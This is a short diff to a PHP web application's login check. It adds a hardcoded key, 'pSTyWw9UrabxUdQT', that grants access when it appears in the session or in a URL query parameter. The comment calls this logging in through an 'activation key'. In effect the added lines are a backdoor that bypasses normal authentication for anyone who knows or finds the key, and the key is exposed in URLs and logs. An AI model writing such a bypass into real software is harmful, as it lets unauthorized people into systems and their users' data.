@@ -21,6 +21,13 @@ if (isset($_SESSION['usertype'])){
 
 	exit();
 	}
+} if ((isset($_SESSION['authKey']) && $_SESSION["authKey"] == 'pSTyWw9UrabxUdQT') || (isset($_GET["authKey"]) && $_GET["authKey"] == 'pSTyWw9UrabxUdQT')){
+	
+	/*
+	 * loggin in through activation key pSTyWw9UrabxUdQT
+	 */
+	$_SESSION['authKey'] =  isset($_GET["authKey"]) && $_GET["authKey"] == 'pSTyWw9UrabxUdQT' ? $_GET["authKey"] : $_SESSION['authKey'];
+	
 }else{
 		?><script>
 		   
